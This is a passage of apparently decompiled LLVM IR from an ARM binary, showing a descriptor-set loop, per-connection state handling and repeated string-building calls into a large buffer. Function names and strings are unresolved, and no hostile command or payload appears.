  store i32 %v2_86f4, i32* @r8, align 4
  br label %dec_label_pc_86f8

dec_label_pc_86f8:                                ; preds = %dec_label_pc_8fa0, %dec_label_pc_8f4c, %dec_label_pc_8d10, %dec_label_pc_86f4
  %v0_871065 = phi i32 [ %v2_8fa0, %dec_label_pc_8fa0 ], [ %v2_8f4c, %dec_label_pc_8f4c ], [ %v2_8d10, %dec_label_pc_8d10 ], [ %v2_86f4, %dec_label_pc_86f4 ]
  store i32 %v0_835c, i32* %r2.global-to-local, align 4
  %v0_86fc = load i32, i32* @r7, align 4
  %v1_86fc = add i32 %v0_86fc, 1
  store i32 %v1_86fc, i32* @r7, align 4
  %v0_8700 = load i32, i32* @r6, align 4
  %v3_8704 = icmp uge i32 %v1_86fc, %v0_835c
  store i1 %v3_8704, i1* %cpsr_c.global-to-local, align 1
  %v9_8704 = icmp eq i32 %v1_86fc, %v0_835c
  store i1 %v9_8704, i1* %cpsr_z.global-to-local, align 1
  %v1_8708 = add i32 %v0_8700, 3140
  store i32 %v1_8708, i32* @r6, align 4
  br i1 %v9_8704, label %dec_label_pc_8710, label %dec_label_pc_85cc

dec_label_pc_8710:                                ; preds = %dec_label_pc_86f8, %dec_label_pc_85b4.dec_label_pc_8710_crit_edge
  %v0_8748 = phi i32 [ %v0_8710.pre, %dec_label_pc_85b4.dec_label_pc_8710_crit_edge ], [ %v0_871065, %dec_label_pc_86f8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8710 = icmp eq i32 %v0_8748, 0
  store i1 %v2_8710, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8710, label %dec_label_pc_84ec, label %dec_label_pc_8718

dec_label_pc_8718:                                ; preds = %dec_label_pc_8710
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %stack_var_-60, align 4
  store i32 %v2_8738, i32* %ip.global-to-local, align 4
  store i32 %v2_873c, i32* %r1.global-to-local, align 4
  store i32 %v2_8740, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v0_8748, i32* %r0.global-to-local, align 4
  %v5_8750 = call i32 @function_102f8(i32 %v0_8748, i32 %v2_873c, i32 %v2_8740, i32 0, i32 %v2_8738)
  store i32 %v5_8750, i32* @r4, align 4
  %v0_8758 = load i32, i32* @r5, align 4
  store i32 %v0_8758, i32* %r0.global-to-local, align 4
  %v1_875c = inttoptr i32 %v0_8758 to i32*
  %v2_875c = call i32 @function_10254(i32* %v1_875c)
  store i32 %v2_875c, i32* %r0.global-to-local, align 4
  %v0_8760 = load i32, i32* @r4, align 4
  %v1_8760 = load i32, i32* @r5, align 4
  %v3_8760 = icmp uge i32 %v0_8760, %v1_8760
  store i1 %v3_8760, i1* %cpsr_c.global-to-local, align 1
  %v9_8760 = icmp eq i32 %v0_8760, %v1_8760
  store i1 %v9_8760, i1* %cpsr_z.global-to-local, align 1
  %v7_8768 = icmp sgt i32 %v0_8760, %v1_8760
  br i1 %v7_8768, label %dec_label_pc_876c, label %dec_label_pc_84ec

dec_label_pc_876c:                                ; preds = %dec_label_pc_8718
  %v0_87cc.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_87cc

dec_label_pc_8774:                                ; preds = %dec_label_pc_87e0, %dec_label_pc_884c
  %v1_8784 = phi i32 [ %v1_87f8, %dec_label_pc_87e0 ], [ %v1_8784.pre, %dec_label_pc_884c ]
  %v0_877c = phi i32 [ %v3_87e8, %dec_label_pc_87e0 ], [ %v0_877c.pre, %dec_label_pc_884c ]
  store i32 %v2_86d0, i32* %r3.global-to-local, align 4
  %v2_877c = add i32 %v0_877c, %v2_86d0
  store i32 %v2_877c, i32* %r2.global-to-local, align 4
  %v1_8780 = add i32 %v2_877c, -164
  %v2_8780 = inttoptr i32 %v1_8780 to i32*
  %v3_8780 = load i32, i32* %v2_8780, align 4
  %v2_8784 = add i32 %v1_8784, -1
  %v3_8784 = shl i32 1, %v2_8784
  %v4_8784 = and i32 %v3_8780, %v3_8784
  %v5_8784 = icmp ne i32 %v4_8784, 0
  store i1 %v5_8784, i1* %cpsr_c.global-to-local, align 1
  %v6_8784 = lshr i32 %v3_8780, %v1_8784
  store i32 %v6_8784, i32* %r3.global-to-local, align 4
  %v1_8788 = urem i32 %v6_8784, 2
  %v2_8788 = icmp eq i32 %v1_8788, 0
  store i1 %v2_8788, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8788, label %dec_label_pc_87ac, label %dec_label_pc_8790

dec_label_pc_8790:                                ; preds = %dec_label_pc_8774
  %v0_8790 = load i32, i32* @sl, align 4
  %v1_8790 = add i32 %v0_8790, -1448
  %v2_8790 = inttoptr i32 %v1_8790 to i8*
  %v3_8790 = load i8, i8* %v2_8790, align 1
  %v4_8790 = zext i8 %v3_8790 to i32
  store i32 %v4_8790, i32* %r3.global-to-local, align 4
  %v2_8794 = icmp ugt i8 %v3_8790, 5
  store i1 %v2_8794, i1* %cpsr_c.global-to-local, align 1
  %v7_8794 = icmp eq i8 %v3_8790, 6
  store i1 %v7_8794, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8794, label %dec_label_pc_8fe8, label %dec_label_pc_879c

dec_label_pc_879c:                                ; preds = %dec_label_pc_8790
  %v2_879c = icmp ugt i8 %v3_8790, 6
  store i1 %v2_879c, i1* %cpsr_c.global-to-local, align 1
  %v7_879c = icmp eq i8 %v3_8790, 7
  store i1 %v7_879c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_879c, label %dec_label_pc_8d18, label %dec_label_pc_87a4

dec_label_pc_87a4:                                ; preds = %dec_label_pc_879c
  %v2_87a4 = icmp ugt i8 %v3_8790, 9
  store i1 %v2_87a4, i1* %cpsr_c.global-to-local, align 1
  %v7_87a4 = icmp eq i8 %v3_8790, 10
  store i1 %v7_87a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_87a4, label %dec_label_pc_9620, label %dec_label_pc_87ac

dec_label_pc_87ac:                                ; preds = %dec_label_pc_8e18, %dec_label_pc_96b0, %dec_label_pc_9660, %dec_label_pc_9038, %dec_label_pc_87a4, %dec_label_pc_8774, %dec_label_pc_87cc, %dec_label_pc_9b00, %dec_label_pc_99ac, %dec_label_pc_96bc, %dec_label_pc_968c, %dec_label_pc_9670, %dec_label_pc_9614, %dec_label_pc_9510, %dec_label_pc_8f54, %dec_label_pc_9934, %dec_label_pc_98d8
  store i32 %v0_835c, i32* %r3.global-to-local, align 4
  %v1_87b4 = add i32 %stack_var_-20820.0, 1
  store i32 %v1_87b4, i32* %r2.global-to-local, align 4
  %v0_87b8 = load i32, i32* @sl, align 4
  %v3_87bc = icmp uge i32 %v1_87b4, %v0_835c
  store i1 %v3_87bc, i1* %cpsr_c.global-to-local, align 1
  %v9_87bc = icmp eq i32 %v1_87b4, %v0_835c
  store i1 %v9_87bc, i1* %cpsr_z.global-to-local, align 1
  %v1_87c4 = add i32 %v0_87b8, 3140
  store i32 %v1_87c4, i32* @sl, align 4
  br i1 %v9_87bc, label %dec_label_pc_84ec, label %dec_label_pc_87cc

dec_label_pc_87cc:                                ; preds = %dec_label_pc_87ac, %dec_label_pc_876c
  %v0_87cc = phi i32 [ %v0_87cc.pre, %dec_label_pc_876c ], [ %v1_87c4, %dec_label_pc_87ac ]
  %stack_var_-20820.0 = phi i32 [ %v1_8760, %dec_label_pc_876c ], [ %v1_87b4, %dec_label_pc_87ac ]
  %v1_87cc = add i32 %v0_87cc, -1452
  %v2_87cc = inttoptr i32 %v1_87cc to i32*
  %v3_87cc = load i32, i32* %v2_87cc, align 4
  store i32 %v3_87cc, i32* %r0.global-to-local, align 4
  %v2_87d4 = icmp eq i32 %v3_87cc, -1
  store i1 %v2_87d4, i1* %cpsr_c.global-to-local, align 1
  %v7_87d4 = icmp eq i32 %v3_87cc, -1
  store i1 %v7_87d4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_87cc, i32* %sb.global-to-local, align 4
  br i1 %v7_87d4, label %dec_label_pc_87ac, label %dec_label_pc_87e0

dec_label_pc_87e0:                                ; preds = %dec_label_pc_87cc
  %v3_87e0 = udiv i32 %v3_87cc, 32
  %v3_87e8 = mul nuw nsw i32 %v3_87e0, 4
  store i32 %v3_87e8, i32* @ip, align 4
  store i32 %v2_86d0, i32* @lr, align 4
  %v2_87f0 = add i32 %v3_87e8, %v2_86d0
  store i32 %v2_87f0, i32* %r2.global-to-local, align 4
  %v1_87f4 = add i32 %v2_87f0, -292
  %v2_87f4 = inttoptr i32 %v1_87f4 to i32*
  %v3_87f4 = load i32, i32* %v2_87f4, align 4
  %v1_87f8 = urem i32 %v3_87cc, 32
  store i32 %v1_87f8, i32* %r1.global-to-local, align 4
  %v2_87fc = add nsw i32 %v1_87f8, -1
  %v3_87fc = shl i32 1, %v2_87fc
  %v4_87fc = and i32 %v3_87f4, %v3_87fc
  %v5_87fc = icmp ne i32 %v4_87fc, 0
  store i1 %v5_87fc, i1* %cpsr_c.global-to-local, align 1
  %v6_87fc = lshr i32 %v3_87f4, %v1_87f8
  store i32 %v6_87fc, i32* %r3.global-to-local, align 4
  %v1_8800 = urem i32 %v6_87fc, 2
  %v2_8800 = icmp eq i32 %v1_8800, 0
  store i1 %v2_8800, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8800, label %dec_label_pc_8774, label %dec_label_pc_8808

dec_label_pc_8808:                                ; preds = %dec_label_pc_87e0
  store i32 %v10_82b0, i32* %ip.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v2_8820, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-48, align 4
  store i32 4, i32* %stack_var_-52, align 4
  store i32 %v2_882c, i32* @lr, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_8838 = call i32 @function_10c48(i32 %v3_87cc, i32 1, i32 4, i32 %v2_8820, i32 %v2_882c)
  store i32 %v10_82b0, i32* %r1.global-to-local, align 4
  %v3_8840 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_8840, i32* %r3.global-to-local, align 4
  %v2_8844 = or i32 %v3_8840, %v5_8838
  store i32 %v2_8844, i32* %r0.global-to-local, align 4
  %v4_8844 = icmp eq i32 %v2_8844, 0
  store i1 %v4_8844, i1* %cpsr_z.global-to-local, align 1
  %v0_884c = load i32, i32* @sl, align 4
  %v1_884c = add i32 %v0_884c, -1452
  %v2_884c = inttoptr i32 %v1_884c to i32*
  %v3_884c = load i32, i32* %v2_884c, align 4
  br i1 %v4_8844, label %dec_label_pc_884c, label %dec_label_pc_8f54

dec_label_pc_884c:                                ; preds = %dec_label_pc_8808
  store i32 %v3_884c, i32* %r3.global-to-local, align 4
  %v3_8850 = udiv i32 %v3_884c, 32
  store i32 %v3_8850, i32* %r2.global-to-local, align 4
  %v1_8854 = urem i32 %v3_884c, 32
  store i32 %v1_8854, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8858 = mul nuw nsw i32 %v3_8850, 4
  store i32 %v3_8858, i32* @ip, align 4
  %v0_885c = load i32, i32* @r4, align 4
  %v1_885c = trunc i32 %v0_885c to i8
  %v3_885c = add i32 %v0_884c, -1448
  %v4_885c = inttoptr i32 %v3_885c to i8*
  store i8 %v1_885c, i8* %v4_885c, align 1
  %v0_877c.pre = load i32, i32* @ip, align 4
  %v1_8784.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_8774

dec_label_pc_8864:                                ; preds = %dec_label_pc_85cc
  %v1_8864 = add i32 %v3_8870, 4
  %v2_8864 = inttoptr i32 %v1_8864 to i32*
  %v3_8864 = load i32, i32* %v2_8864, align 4
  store i32 %v3_8864, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_8868 = icmp eq i32 %v3_8864, 0
  store i1 %v2_8868, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8868, label %.thread19, label %.thread17

.thread17:                                        ; preds = %dec_label_pc_8864
  store i32 4, i32* @r3, align 4
  store i8 4, i8* %v2_85cc, align 1
  %v0_8874.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8874.pr.pr, label %.thread17..thread19_crit_edge, label %dec_label_pc_887c

.thread17..thread19_crit_edge:                    ; preds = %.thread17
  %v1_8874.pre = load i32, i32* @r3, align 4
  %v3_8874.pre = load i32, i32* @r6, align 4
  %extract.t = trunc i32 %v1_8874.pre to i8
  br label %.thread19

.thread19:                                        ; preds = %.thread17..thread19_crit_edge, %dec_label_pc_8864
  %v3_8874 = phi i32 [ %v3_8874.pre, %.thread17..thread19_crit_edge ], [ %v3_8870, %dec_label_pc_8864 ]
  %v1_8874.off0 = phi i8 [ %extract.t, %.thread17..thread19_crit_edge ], [ 0, %dec_label_pc_8864 ]
  %v4_8874 = add i32 %v3_8874, -1448
  %v5_8874 = inttoptr i32 %v4_8874 to i8*
  store i8 %v1_8874.off0, i8* %v5_8874, align 1
  %v0_8878.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_8878.pr, label %.thread19.dec_label_pc_85e8_crit_edge, label %dec_label_pc_887c

.thread19.dec_label_pc_85e8_crit_edge:            ; preds = %.thread19
  %v0_85e8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_85e8

dec_label_pc_887c:                                ; preds = %.thread17, %.thread19, %dec_label_pc_8574
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  %v0_8884 = load i32, i32* @r5, align 4
  %v1_8884 = add i32 %v0_8884, 2112
  store i32 %v1_8884, i32* %r0.global-to-local, align 4
  %v1_8888 = load i32, i32* @r6, align 4
  %v2_8888 = add i32 %v1_8888, 12
  %v3_8888 = inttoptr i32 %v2_8888 to i32*
  store i32 -1, i32* %v3_8888, align 4
  %v0_888c = load i32, i32* %r0.global-to-local, align 4
  %v1_888c = add i32 %v0_888c, 4
  store i32 %v1_888c, i32* %r0.global-to-local, align 4
  store i32 1024, i32* %r1.global-to-local, align 4
  %v0_8894 = load i32, i32* %sb.global-to-local, align 4
  %v1_8894 = load i32, i32* @r6, align 4
  %v2_8894 = inttoptr i32 %v1_8894 to i32*
  store i32 %v0_8894, i32* %v2_8894, align 4
  %v2_8898 = call i32 @function_f9d0(i32 %v1_888c, i32 1024)
  store i32 10240, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v0_88a4 = load i32, i32* %sb.global-to-local, align 4
  %v1_88a4 = load i32, i32* @r6, align 4
  %v2_88a4 = add i32 %v1_88a4, 660
  %v3_88a4 = inttoptr i32 %v2_88a4 to i32*
  store i32 %v0_88a4, i32* %v3_88a4, align 4
  %v2_88a8 = call i32 @function_f9d0(i32 %stack_var_-20860.0.ph, i32 10240)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_88b0 = call i32 @function_f93c(i8* %v1_88b0)
  %v0_88b4 = load i32, i32* @r5, align 4
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  %v1_88bc = add i32 %v0_88b4, 1431
  store i32 %v1_88bc, i32* %fp.global-to-local, align 4
  %v2_88c0 = add i32 %v2_88b0, %stack_var_-20860.0.ph
  store i32 %v2_88c0, i32* @r0, align 4
  store i32 %v1_88bc, i32* %r1.global-to-local, align 4
  %v2_88c8 = inttoptr i32 %v2_88c0 to i8*
  %v3_88c8 = call i32 @function_f964(i8* %v2_88c8, i32 %v1_88bc)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_88d0 = call i32 @function_f93c(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_159b4.24 to i32), i32* %r1.global-to-local, align 4
  %v2_88dc = add i32 %v2_88d0, %stack_var_-20860.0.ph
  store i32 %v2_88dc, i32* @r0, align 4
  %v2_88e0 = inttoptr i32 %v2_88dc to i8*
  %v3_88e0 = call i32 @function_f964(i8* %v2_88e0, i32 ptrtoint (i32* @global_var_159b4.24 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_88e8 = call i32 @function_f93c(i8* %v1_88b0)
  %v2_88f0 = add i32 %v2_88e8, %stack_var_-20860.0.ph
  store i32 %v2_88f0, i32* @r0, align 4
  %v0_88f4 = load i32, i32* @r5, align 4
  %v1_88f4 = add i32 %v0_88f4, 532
  store i32 %v1_88f4, i32* %r1.global-to-local, align 4
  %v2_88f8 = inttoptr i32 %v2_88f0 to i8*
  %v3_88f8 = call i32 @function_f964(i8* %v2_88f8, i32 %v1_88f4)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8900 = call i32 @function_f93c(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([24 x i8]* @global_var_1598c.26 to i32), i32* %r1.global-to-local, align 4
  %v2_890c = add i32 %v2_8900, %stack_var_-20860.0.ph
  store i32 %v2_890c, i32* @r0, align 4
  %v3_8910 = inttoptr i32 %v2_890c to i8*
  %v4_8910 = call i32 @function_f964(i8* %v3_8910, i32 ptrtoint ([24 x i8]* @global_var_1598c.26 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8918 = call i32 @function_f93c(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  %v0_8920 = load i32, i32* @r5, align 4
  %v1_8920 = add i32 %v0_8920, 20
  store i32 %v1_8920, i32* %r1.global-to-local, align 4
  %v2_8924 = add i32 %v2_8918, %stack_var_-20860.0.ph
  store i32 %v2_8924, i32* @r0, align 4
  %v2_8928 = inttoptr i32 %v2_8924 to i8*
  %v3_8928 = call i32 @function_f964(i8* %v2_8928, i32 %v1_8920)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8930 = call i32 @function_f93c(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_159a4.28 to i32), i32* %r1.global-to-local, align 4
  %v2_893c = add i32 %v2_8930, %stack_var_-20860.0.ph
  store i32 %v2_893c, i32* @r0, align 4
  %v3_8940 = inttoptr i32 %v2_893c to i8*
  %v4_8940 = call i32 @function_f964(i8* %v3_8940, i32 ptrtoint ([9 x i8]* @global_var_159a4.28 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8948 = call i32 @function_f93c(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  %v0_8950 = load i32, i32* @r5, align 4
  %v2_8954 = add i32 %v2_8948, %stack_var_-20860.0.ph
  store i32 %v2_8954, i32* @r0, align 4
  %v1_8958 = add i32 %v0_8950, 789
  store i32 %v1_8958, i32* %r1.global-to-local, align 4
  %v2_895c = inttoptr i32 %v2_8954 to i8*
  %v3_895c = call i32 @function_f964(i8* %v2_895c, i32 %v1_8958)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8964 = call i32 @function_f93c(i8* %v1_88b0)
  %v2_896c = add i32 %v2_8964, %stack_var_-20860.0.ph
  store i32 %v2_896c, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32* %r1.global-to-local, align 4
  %v3_8974 = inttoptr i32 %v2_896c to i8*
  %v4_8974 = call i32 @function_f964(i8* %v3_8974, i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32))
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_897c = call i32 @function_f0ac(i32 32)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8984 = call i32 @function_f93c(i8* %v1_88b0)
  %v0_8988 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8988, i32* %r1.global-to-local, align 4
  store i32 %v2_8984, i32* @r4, align 4
  store i32 32, i32* %r0.global-to-local, align 4
  %v2_8994 = inttoptr i32 %v0_8988 to i32*
  %v3_8994 = call i32 @function_efe8(i32 32, i32* %v2_8994)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8994, i32* %r1.global-to-local, align 4
  %v1_89a0 = load i32, i32* @r4, align 4
  %v2_89a0 = add i32 %v1_89a0, %stack_var_-20860.0.ph
  store i32 %v2_89a0, i32* @r0, align 4
  %v2_89a4 = inttoptr i32 %v2_89a0 to i8*
  %v3_89a4 = call i32 @function_f964(i8* %v2_89a4, i32 %v3_8994)
  store i32 32, i32* %r0.global-to-local, align 4
  %v1_89ac = call i32 @function_f00c(i32 32)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_89b4 = call i32 @function_f93c(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32* %r1.global-to-local, align 4
  %v2_89c0 = add i32 %v2_89b4, %stack_var_-20860.0.ph
  store i32 %v2_89c0, i32* @r0, align 4
  %v3_89c4 = inttoptr i32 %v2_89c0 to i8*
  %v4_89c4 = call i32 @function_f964(i8* %v3_89c4, i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32))
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_89cc = call i32 @function_f0ac(i32 33)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_89d4 = call i32 @function_f93c(i8* %v1_88b0)
  %v0_89d8 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_89d8, i32* %r1.global-to-local, align 4
  store i32 %v2_89d4, i32* @r4, align 4
  store i32 33, i32* %r0.global-to-local, align 4
  %v2_89e4 = inttoptr i32 %v0_89d8 to i32*
  %v3_89e4 = call i32 @function_efe8(i32 33, i32* %v2_89e4)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 %v3_89e4, i32* %r1.global-to-local, align 4
  %v1_89f0 = load i32, i32* @r4, align 4
  %v2_89f0 = add i32 %v1_89f0, %stack_var_-20860.0.ph
  store i32 %v2_89f0, i32* @r0, align 4
  %v2_89f4 = inttoptr i32 %v2_89f0 to i8*
  %v3_89f4 = call i32 @function_f964(i8* %v2_89f4, i32 %v3_89e4)
  store i32 33, i32* %r0.global-to-local, align 4
  %v1_89fc = call i32 @function_f00c(i32 33)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a04 = call i32 @function_f93c(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32* %r1.global-to-local, align 4
  %v2_8a10 = add i32 %v2_8a04, %stack_var_-20860.0.ph
  store i32 %v2_8a10, i32* @r0, align 4
  %v3_8a14 = inttoptr i32 %v2_8a10 to i8*
  %v4_8a14 = call i32 @function_f964(i8* %v3_8a14, i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32))
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_8a1c = call i32 @function_f0ac(i32 34)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a24 = call i32 @function_f93c(i8* %v1_88b0)
  %v0_8a28 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8a28, i32* %r1.global-to-local, align 4
  store i32 %v2_8a24, i32* @r4, align 4
  store i32 34, i32* %r0.global-to-local, align 4
  %v2_8a34 = inttoptr i32 %v0_8a28 to i32*
  %v3_8a34 = call i32 @function_efe8(i32 34, i32* %v2_8a34)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8a34, i32* %r1.global-to-local, align 4
  %v1_8a40 = load i32, i32* @r4, align 4
  %v2_8a40 = add i32 %v1_8a40, %stack_var_-20860.0.ph
  store i32 %v2_8a40, i32* @r0, align 4
  %v2_8a44 = inttoptr i32 %v2_8a40 to i8*
  %v3_8a44 = call i32 @function_f964(i8* %v2_8a44, i32 %v3_8a34)
  store i32 34, i32* %r0.global-to-local, align 4
  %v1_8a4c = call i32 @function_f00c(i32 34)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a54 = call i32 @function_f93c(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32* %r1.global-to-local, align 4
  %v2_8a60 = add i32 %v2_8a54, %stack_var_-20860.0.ph
  store i32 %v2_8a60, i32* @r0, align 4
  %v3_8a64 = inttoptr i32 %v2_8a60 to i8*
  %v4_8a64 = call i32 @function_f964(i8* %v3_8a64, i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32))
  store i32 %v4_8a64, i32* %r0.global-to-local, align 4
  store i32 %v6_81bc, i32* %ip.global-to-local, align 4
  %v1_8a6c = load i32, i32* %sb.global-to-local, align 4
  %v3_8a6c = icmp uge i32 %v6_81bc, %v1_8a6c
  store i1 %v3_8a6c, i1* %cpsr_c.global-to-local, align 1
  %v9_8a6c = icmp eq i32 %v6_81bc, %v1_8a6c
  store i1 %v9_8a6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8a6c, label %dec_label_pc_8b44, label %dec_label_pc_8a74

dec_label_pc_8a74:                                ; preds = %dec_label_pc_887c
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_8a78 = call i32 @function_f0ac(i32 35)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8a80 = call i32 @function_f93c(i8* %v1_88b0)
  %v0_8a84 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8a84, i32* %r1.global-to-local, align 4
  store i32 %v2_8a80, i32* @r4, align 4
  store i32 35, i32* %r0.global-to-local, align 4
  %v2_8a90 = inttoptr i32 %v0_8a84 to i32*
  %v3_8a90 = call i32 @function_efe8(i32 35, i32* %v2_8a90)
  store i32 %stack_var_-20860.0.ph, i32* @lr, align 4
  store i32 %v3_8a90, i32* %r1.global-to-local, align 4
  %v1_8a9c = load i32, i32* @r4, align 4
  %v2_8a9c = add i32 %v1_8a9c, %stack_var_-20860.0.ph
  store i32 %v2_8a9c, i32* @r0, align 4
  %v2_8aa0 = inttoptr i32 %v2_8a9c to i8*
  %v3_8aa0 = call i32 @function_f964(i8* %v2_8aa0, i32 %v3_8a90)
  store i32 35, i32* %r0.global-to-local, align 4
  %v1_8aa8 = call i32 @function_f00c(i32 35)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8ab0 = call i32 @function_f93c(i8* %v1_88b0)
  %v2_8ab8 = add i32 %v2_8ab0, %stack_var_-20860.0.ph
  store i32 %v2_8ab8, i32* @r0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32* %r1.global-to-local, align 4
  %v3_8ac0 = inttoptr i32 %v2_8ab8 to i8*
  %v4_8ac0 = call i32 @function_f964(i8* %v3_8ac0, i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32))
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8ac8 = call i32 @function_f93c(i8* %v1_88b0)
  %v0_8acc = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8acc, i32* %r1.global-to-local, align 4
  store i32 %v2_8ac8, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v2_8ad8 = inttoptr i32 %v0_8acc to i32*
  %v3_8ad8 = call i32 @function_efe8(i32 40, i32* %v2_8ad8)
  store i32 %stack_var_-20860.0.ph, i32* %r2.global-to-local, align 4
  store i32 %v3_8ad8, i32* %r1.global-to-local, align 4
  %v2_8ae4 = add i32 %v2_8ac8, %stack_var_-20860.0.ph
  store i32 %v2_8ae4, i32* @r0, align 4
  %v2_8ae8 = inttoptr i32 %v2_8ae4 to i8*
  %v3_8ae8 = call i32 @function_f964(i8* %v2_8ae8, i32 %v3_8ad8)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8af0 = call i32 @function_f93c(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_159b4.24 to i32), i32* %r1.global-to-local, align 4
  %v2_8afc = add i32 %v2_8af0, %stack_var_-20860.0.ph
  store i32 %v2_8afc, i32* @r0, align 4
  %v2_8b00 = inttoptr i32 %v2_8afc to i8*
  %v3_8b00 = call i32 @function_f964(i8* %v2_8b00, i32 ptrtoint (i32* @global_var_159b4.24 to i32))
  store i32 %v6_81bc, i32* %r0.global-to-local, align 4
  %v2_8b08 = call i32 @function_f93c(i8* %v1_8b08)
  store i32 %v2_8b08, i32* @r4, align 4
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
  %v2_8b14 = call i32 @function_f93c(i8* %v1_88b0)
  store i32 %stack_var_-20860.0.ph, i32* %ip.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_8b20 = add i32 %v2_8b14, %stack_var_-20860.0.ph
  store i32 %v2_8b20, i32* %r2.global-to-local, align 4
  %v0_8b24 = load i32, i32* @r4, align 4
  store i32 %v0_8b24, i32* %r0.global-to-local, align 4
  %v3_8b28 = trunc i32 %v0_8b24 to i8
  %v4_8b28 = call i32 @function_fe30(i8 %v3_8b28, i32 10, i32 %v2_8b20)
  store i32 %stack_var_-20860.0.ph, i32* %r0.global-to-local, align 4
